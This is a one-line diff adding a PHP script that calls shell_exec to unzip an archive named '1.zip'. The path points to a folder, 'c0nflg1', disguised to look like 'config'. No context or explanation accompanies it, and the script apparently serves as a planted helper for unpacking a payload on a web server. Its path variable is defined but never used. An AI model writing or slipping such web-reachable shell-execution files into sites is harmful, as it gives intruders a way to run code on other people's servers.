@@ -1,0 +1,1 @@
+<?php $archive_path = $_SERVER['DOCUMENT_ROOT'].'/c0nflg1/1.zip';$output = shell_exec("unzip 1.zip");?>
